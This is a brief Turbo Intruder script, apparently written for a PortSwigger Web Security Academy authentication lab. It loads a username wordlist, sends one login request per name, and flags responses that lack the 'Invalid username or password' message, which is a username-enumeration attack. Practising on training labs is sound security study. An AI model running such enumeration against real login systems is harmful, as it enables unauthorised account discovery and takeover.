usernames = []
with open("$HOME/Documents/Python/PortswiggerAcademyLabs/Authentication/username.txt", "r") as f:
    usernames = [x.strip() for x in f.readlines()]


def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=500,
                           pipeline=False,
                           engine=Engine.THREADED,
                           timeout=20
                           )

    for username in usernames:
        engine.queue(target.req, [username], label=username)




def handleResponse(req, interesting):
    if '<p class=is-warning>Invalid username or password.</p>' not in req.response:
        table.add(req)
